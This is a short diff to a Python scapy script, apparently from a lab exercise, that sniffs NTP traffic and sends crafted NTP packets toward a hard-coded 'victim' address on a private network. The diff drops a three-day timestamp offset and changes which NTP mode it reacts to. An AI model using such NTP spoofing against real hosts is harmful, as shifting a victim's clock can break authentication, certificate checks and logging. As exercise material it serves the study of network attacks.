@@ -1,12 +1,11 @@
 from scapy.all import IP, UDP, NTP, send, sniff, Ether
 from scapy.layers.ntp import NTP
 import time, datetime
-#import os
+import os
 
 
 server_ip = "10.10.10.12"
 victim_ip = "10.10.10.10"
-ref_timestamp = time.time() + 259200
 #all these values are hard coded for the sake of this exercise
 def send_ntp(server, packet):
     print('here')
@@ -36,7 +35,7 @@ def send_ntp(server, packet):
 def ntp_request(packet):
     print('here')
     ntp_layer = packet.getlayer(NTP)
-    if ntp_layer and ntp_layer.mode == 3:
+    if ntp_layer and ntp_layer.mode == 4:
         send_ntp(victim_ip, packet)
 
 if __name__ == "__main__":
